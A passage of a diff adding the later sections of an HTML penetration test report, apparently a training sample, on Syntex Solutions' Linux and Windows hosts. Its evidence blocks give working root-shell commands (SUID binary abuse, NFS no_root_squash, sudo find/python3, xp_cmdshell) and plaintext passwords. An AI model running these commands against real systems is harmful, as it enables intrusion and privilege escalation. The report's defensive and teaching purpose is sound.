+        <div class="finding-meta-item"><label>Binary</label><span>/usr/local/bin/syntex-backup</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 6.3</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>A custom backup binary has the SUID bit set and accepts a user-supplied argument that is passed directly to <code>system()</code> after calling <code>setuid(0)</code>. Any local user can pass arbitrary shell commands as an argument to execute them as root.</p>
+      <h4>Evidence</h4>
+      <pre>find / -perm -4000 -type f 2>/dev/null
+# /usr/local/bin/syntex-backup
+
+/usr/local/bin/syntex-backup "/bin/bash -p"
+# bash-5.0# id
+# uid=0(root) gid=0(root)</pre>
+      <h4>Remediation</h4>
+      <ul>
+        <li>Remove the SUID bit: <code>chmod u-s /usr/local/bin/syntex-backup</code></li>
+        <li>Rewrite the binary to not accept user-supplied command arguments</li>
+        <li>Audit all SUID binaries: <code>find / -perm -4000 -type f 2&gt;/dev/null</code></li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- LNX-04 -->
+  <div class="finding">
+    <div class="finding-header high">
+      <span class="finding-id">LNX-04</span>
+      <span class="badge badge-high">High</span>
+      <span class="finding-title">SSH Root Login Permitted with Password Authentication</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>7.5</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>22/TCP</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 8.2</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>SSH is configured to allow direct root login using password authentication. This means an attacker who obtains or brute-forces the root password can gain immediate administrative access. The root password (Syntex2024!) was identified in a credential file on the FTP server.</p>
+      <h4>Evidence</h4>
+      <pre>grep "PermitRootLogin" /etc/ssh/sshd_config
+# PermitRootLogin yes
+
+# Using credentials found in /var/ftp/private/db_credentials.txt:
+ssh root@10.1.53.39
+# Password: Syntex2024!
+# root@syntex-lnx01:~#</pre>
+      <h4>Remediation</h4>
+      <ul>
+        <li>Set <code>PermitRootLogin no</code> in /etc/ssh/sshd_config</li>
+        <li>Require sudo for administrative access from named admin accounts</li>
+        <li>Enforce SSH key-based authentication and disable password auth where possible</li>
+        <li>Change root password immediately</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- LNX-05 -->
+  <div class="finding">
+    <div class="finding-header high">
+      <span class="finding-id">LNX-05</span>
+      <span class="badge badge-high">High</span>
+      <span class="finding-title">NFS Exports Configured with no_root_squash</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>7.5</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>2049/TCP</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 7.2</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>NFS exports including /home are configured with <code>no_root_squash</code> and world-readable access. The no_root_squash option means root on the connecting client is treated as root on the NFS server. An attacker can mount the share, place a SUID shell binary, and execute it from the server to gain root.</p>
+      <h4>Evidence</h4>
+      <pre>cat /etc/exports
+# /home *(rw,sync,no_subtree_check,no_root_squash,insecure)
+
+# From attacker machine (as root):
+mount -t nfs 10.1.53.39:/home /tmp/nfsmount
+cp /bin/bash /tmp/nfsmount/pwn
+chmod u+s /tmp/nfsmount/pwn
+
+# From SYNTEX-LNX01 as low-priv user:
+/home/pwn -p
+# root@syntex-lnx01:~#</pre>
+      <h4>Remediation</h4>
+      <ul>
+        <li>Add <code>root_squash</code> to all NFS exports</li>
+        <li>Restrict exports to specific trusted IP addresses, not wildcard *</li>
+        <li>Remove /home from NFS exports entirely unless operationally required</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- LNX-06 -->
+  <div class="finding">
+    <div class="finding-header high">
+      <span class="finding-id">LNX-06</span>
+      <span class="badge badge-high">High</span>
+      <span class="finding-title">Sudo NOPASSWD Misconfiguration - Privilege Escalation via find/vim/python3</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>7.8</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 7.2</span></div>
+        <div class="finding-meta-item"><label>Ref</label><span>GTFOBins</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>Multiple accounts are configured with NOPASSWD sudo entries for binaries that can trivially be used to spawn a root shell (find, vim, python3). GTFOBins documents exploitation of all three.</p>
+      <h4>Evidence</h4>
+      <pre>sudo -l -U jsmith
+# (ALL) NOPASSWD: /usr/bin/find
+# (ALL) NOPASSWD: /usr/bin/vim
+
+# Exploit via find:
+sudo find . -exec /bin/bash \; -quit
+# root@syntex-lnx01:#
+
+# Exploit via python3 (guest account):
+sudo python3 -c 'import os; os.system("/bin/bash")'</pre>
+      <h4>Remediation</h4>
+      <ul>
+        <li>Remove all NOPASSWD sudo entries for file editors, interpreters, and search tools</li>
+        <li>Audit sudoers: <code>grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/</code></li>
+        <li>Apply principle of least privilege - grant sudo only for specific administrative tasks that require it</li>
+        <li>Reference GTFOBins (gtfobins.github.io) when evaluating any sudo permission</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 7: MEDIUM FINDINGS -->
+<div class="section">
+  <div class="section-hdr">
+    <span class="section-tag">Section 7</span>
+    <h2>Medium Findings</h2>
+  </div>
+
+  <div class="finding">
+    <div class="finding-header medium">
+      <span class="finding-id">LNX-07</span>
+      <span class="badge badge-medium">Medium</span>
+      <span class="finding-title">MySQL Remote Root Access - Listening on All Interfaces</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>6.5</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>3306/TCP</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 6.3, 7.2</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>MySQL is bound to all network interfaces and the root account is accessible remotely with a weak password. The syntexdb database contains an employee table with plaintext passwords for all staff accounts.</p>
+      <h4>Evidence</h4>
+      <pre>mysql -u root -pSyntex2024! -h 10.1.53.39 -e "SELECT * FROM syntexdb.employees;"
+# jsmith | Password1 | IT Engineer
+# mwebb  | Welcome1  | Finance Analyst
+# admin  | Syntex@Admin1 | Administrator</pre>
+      <h4>Remediation</h4>
+      <p>Bind MySQL to 127.0.0.1 only. Remove remote root access. Use application-specific accounts with minimum required permissions. Never store plaintext passwords - use bcrypt or Argon2 hashing.</p>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-header medium">
+      <span class="finding-id">LNX-08</span>
+      <span class="badge badge-medium">Medium</span>
+      <span class="finding-title">SNMP Public Community String - Infrastructure Enumeration</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>6.5</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>161/UDP</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 1.3</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>SNMP v1/v2c is running with the default community string "public" (read) and "private" (read/write). SNMP exposes detailed system information including running processes, installed software, network interfaces, and routing tables.</p>
+      <h4>Evidence</h4>
+      <pre>snmpwalk -c public -v1 10.1.53.39
+# System: syntex-lnx01, Syntex Solutions Server Room, Manchester
+# Running processes, network interfaces, routing table all returned</pre>
+      <h4>Remediation</h4>
+      <p>Disable SNMP v1/v2c. If SNMP monitoring is required, use SNMPv3 with authentication and encryption (authPriv). Use strong, unique community strings. Restrict SNMP access to monitoring hosts only via ACL.</p>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-header medium">
+      <span class="finding-id">LNX-09</span>
+      <span class="badge badge-medium">Medium</span>
+      <span class="finding-title">FTP Anonymous Access - Credential File Exposure</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>6.5</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>21/TCP</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 8.2</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>FTP allows anonymous login and unauthenticated read/write access. A file in /var/ftp/private/db_credentials.txt contains database connection strings including the root MySQL password and the Windows domain SQL Server sa account password in plaintext.</p>
+      <h4>Evidence</h4>
+      <pre>ftp 10.1.53.39
+# Connected. Name: anonymous, Password: (blank)
+# 230 Login successful.
+get private/db_credentials.txt
+# DB: syntex_app / AppPass2024!
+# MSSQL sa / Syntex2024!</pre>
+      <h4>Remediation</h4>
+      <p>Disable anonymous FTP access. Remove credential files from any FTP-accessible location. Consider replacing FTP with SFTP entirely. Rotate all credentials exposed in this file immediately.</p>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-header medium">
+      <span class="finding-id">LNX-10</span>
+      <span class="badge badge-medium">Medium</span>
+      <span class="finding-title">Weak SSL/TLS Configuration - Legacy Protocol Support</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>5.9</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>443/TCP</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 4.2</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>The HTTPS service uses a self-signed SHA1 certificate with a 1024-bit RSA key (both deprecated), supports TLS 1.0/SSL 3.0 (deprecated and vulnerable to POODLE/BEAST), and enables weak cipher suites including RC4 and 3DES.</p>
+      <h4>Remediation</h4>
+      <p>Replace the certificate with a minimum 2048-bit RSA or 256-bit ECDSA certificate from a trusted CA. Disable TLS 1.0, 1.1 and SSL 3.0. Configure only TLS 1.2 and 1.3. Remove RC4, 3DES, and export cipher suites. PCI DSS Req 4.2 explicitly prohibits TLS 1.0 for cardholder data transmission.</p>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-header medium">
+      <span class="finding-id">WIN-05</span>
+      <span class="badge badge-medium">Medium</span>
+      <span class="finding-title">MSSQL xp_cmdshell Enabled - OS Command Execution via SQL</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>6.6</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-DC01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>1433/TCP</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 6.3</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>SQL Server has xp_cmdshell enabled, which allows OS-level commands to be executed from within SQL queries. Combined with the sa account credentials recovered via FTP, an attacker can achieve OS command execution on the domain controller.</p>
+      <h4>Evidence</h4>
+      <pre>sqsh -S 10.0.29.131 -U sa -P Syntex2024!
+# EXEC xp_cmdshell 'whoami'
+# nt authority\system</pre>
+      <h4>Remediation</h4>
+      <p>Disable xp_cmdshell: <code>EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;</code>. Disable it at the policy level. Rotate the sa account password and restrict access to SQL Server to application service accounts only.</p>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-header medium">
+      <span class="finding-id">LNX-11</span>
+      <span class="badge badge-medium">Medium</span>
+      <span class="finding-title">Telnet Service Running - Cleartext Protocol</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>5.3</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>23/TCP</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 4.2</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>Telnet transmits all data including credentials in cleartext. Any attacker with network access can perform passive interception of Telnet sessions to capture usernames and passwords. PCI DSS explicitly prohibits cleartext protocols for administrative access.</p>
+      <h4>Remediation</h4>
+      <p>Disable telnet immediately: <code>systemctl disable telnetd</code>. Use SSH for all remote access. If legacy systems require Telnet, isolate them to a separate VLAN and implement compensating controls.</p>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 8: LOW FINDINGS -->
+<div class="section">
+  <div class="section-hdr">
+    <span class="section-tag">Section 8</span>
+    <h2>Low / Informational Findings</h2>
+  </div>
+
+  <div class="finding">
+    <div class="finding-header low">
+      <span class="finding-id">LNX-12</span>
+      <span class="badge badge-low">Low</span>
+      <span class="finding-title">World-Readable /etc/shadow Backup File</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>4.0</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>File</label><span>/etc/shadow.bak</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 8.3</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>A backup copy of /etc/shadow exists at /etc/shadow.bak with world-readable permissions (644). The shadow file contains hashed passwords for all system accounts. An attacker with any local access can read these hashes and attempt offline cracking.</p>
+      <h4>Evidence</h4>
+      <pre>ls -la /etc/shadow.bak
+# -rw-r--r-- 1 root root 1234 Nov 4 09:11 /etc/shadow.bak
+cat /etc/shadow.bak | grep root
+# root:$6$...hashcat recovers: Syntex2024!</pre>
+      <h4>Remediation</h4>
+      <p>Delete /etc/shadow.bak immediately. Set permissions on /etc/shadow to 640 root:shadow. Implement a process to identify and remove unprotected backup files containing sensitive data.</p>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-header low">
+      <span class="finding-id">LNX-13</span>
+      <span class="badge badge-low">Low</span>
+      <span class="finding-title">Apache Directory Listing Enabled - Backup Files Exposed</span>
+    </div>
+    <div class="finding-body">
+      <div class="finding-meta">
+        <div class="finding-meta-item"><label>CVSS Base Score</label><span>3.7</span></div>
+        <div class="finding-meta-item"><label>Host</label><span>SYNTEX-LNX01</span></div>
+        <div class="finding-meta-item"><label>Port</label><span>80/TCP</span></div>
+        <div class="finding-meta-item"><label>PCI DSS</label><span>Req 6.3</span></div>
+      </div>
+      <h4>Description</h4>
+      <p>Apache directory listing is enabled on the web server. Browsing to /backup/ reveals a configuration backup file containing database credentials and an AWS API key (likely invalid test key, but indicative of poor secrets management practice).</p>
+      <h4>Evidence</h4>
+      <pre>curl http://10.1.53.39/backup/
+# Index of /backup/
+# config.bak  - DB_PASS=AppPass2024!, AWS_KEY=AKIAIOSFODNN7EXAMPLE</pre>
+      <h4>Remediation</h4>
+      <p>Disable directory listing: set <code>Options -Indexes</code> in Apache configuration. Remove backup and configuration files from the web root. Implement a process to prevent secrets from being stored in web-accessible directories. Use a secrets management solution (HashiCorp Vault, AWS Secrets Manager) for credential storage.</p>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 9: REMEDIATION ROADMAP -->
+<div class="section">
+  <div class="section-hdr">
+    <span class="section-tag">Section 9</span>
+    <h2>Remediation Roadmap</h2>
+  </div>
+  <table>
+    <tr><th>Priority</th><th>Finding(s)</th><th>Action</th><th>Timescale</th><th>Owner</th></tr>
+    <tr><td><span class="badge badge-critical">Immediate</span></td><td>LNX-01, LNX-02</td><td>Fix world-writable cron, bind Redis to localhost with auth</td><td>24 hours</td><td>Linux Admin</td></tr>
+    <tr><td><span class="badge badge-critical">Immediate</span></td><td>WIN-01, WIN-02</td><td>Implement gMSA, enable Kerberos pre-auth</td><td>48 hours</td><td>AD Admin</td></tr>
+    <tr><td><span class="badge badge-high">Week 1</span></td><td>LNX-03, LNX-06</td><td>Remove SUID backup binary, fix sudoers</td><td>7 days</td><td>Linux Admin</td></tr>
+    <tr><td><span class="badge badge-high">Week 1</span></td><td>LNX-04, LNX-05</td><td>Disable SSH root login, fix NFS exports</td><td>7 days</td><td>Linux Admin</td></tr>
+    <tr><td><span class="badge badge-high">Week 1</span></td><td>WIN-03, WIN-04</td><td>Disable SMBv1, restrict DNS AXFR</td><td>7 days</td><td>AD Admin</td></tr>
+    <tr><td><span class="badge badge-medium">Week 2-4</span></td><td>LNX-07 to LNX-11, WIN-05</td><td>MySQL bind, disable anon FTP, fix TLS, disable Telnet, disable xp_cmdshell</td><td>30 days</td><td>IT Team</td></tr>
+    <tr><td><span class="badge badge-low">Month 2</span></td><td>LNX-12, LNX-13</td><td>Delete shadow.bak, disable directory listing</td><td>60 days</td><td>IT Team</td></tr>
+  </table>
+</div>
+
+<!-- SECTION 10: COMPLIANCE MAPPING -->
+<div class="section">
+  <div class="section-hdr">
+    <span class="section-tag">Section 10</span>
+    <h2>Compliance Mapping</h2>
+  </div>
+  <table>
+    <tr><th>Regulation / Standard</th><th>Relevant Findings</th><th>Implication</th></tr>
+    <tr><td>PCI DSS v4.0 Req 6.3 - Protect Against Known Vulnerabilities</td><td>WIN-03, LNX-01, LNX-03</td><td>SMBv1, writable cron, SUID binary represent unmanaged vulnerabilities - audit failure risk</td></tr>
+    <tr><td>PCI DSS v4.0 Req 4.2 - Protect Transmission with Strong Cryptography</td><td>LNX-10, LNX-11</td><td>TLS 1.0 and Telnet violate PCI DSS requirements for cardholder data transmission</td></tr>
+    <tr><td>PCI DSS v4.0 Req 7.2 - Least Privilege Access</td><td>LNX-02, LNX-05, LNX-06, LNX-07</td><td>Multiple services grant excessive privileges - direct PCI DSS audit finding</td></tr>
+    <tr><td>PCI DSS v4.0 Req 8.2/8.3 - User Identification and Auth Management</td><td>WIN-01, WIN-02, LNX-04, LNX-12</td><td>Kerberoasting, AS-REP, root SSH, shadow.bak all expose authentication data</td></tr>
+    <tr><td>UK GDPR / DPA 2018 - Article 32 Security of Processing</td><td>LNX-07, LNX-09</td><td>Plaintext employee passwords in MySQL and FTP constitute inadequate protection of personal data</td></tr>
+    <tr><td>FCA SYSC 8 - Operational Resilience</td><td>LNX-01, LNX-02, WIN-01</td><td>Critical findings represent material risk to operational resilience of regulated financial services</td></tr>
+    <tr><td>Computer Misuse Act 1990</td><td>All findings</td><td>These vulnerabilities could facilitate unauthorised access by third parties - organisation has duty of care to secure systems</td></tr>
+  </table>
+
+  <div class="section" style="margin-top:32px; border-top:1px solid var(--border); padding-top:32px;">
+    <h3>Document Sign-Off</h3>
+    <div class="sig">
+      <div class="sig-field">
+        <strong>Prepared by - My Cyber Academy</strong>
+        Lead Penetration Tester<br>
+        mycyberacademy.co.uk<br><br>
+        Signature: ___________________________<br>
+        Date: ________________________________
+      </div>
+      <div class="sig-field">
+        <strong>Reviewed by - Syntex Solutions Ltd</strong>
+        James Elliott, Head of IT<br>
+        Syntex Solutions Ltd<br><br>
+        Signature: ___________________________<br>
+        Date: ________________________________
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div style="margin-top:48px; padding:16px 0; border-top:1px solid var(--border); font-size:12px; color:var(--muted); display:flex; justify-content:space-between; flex-wrap:wrap; gap:8px;">
+  <span>MCA-CPSA-2024-001 - Syntex Solutions Ltd Penetration Test Report v1.0</span>
+  <span>CONFIDENTIAL - My Cyber Academy | mycyberacademy.co.uk</span>
+</div>
+
+</div>
+</body>
+</html>
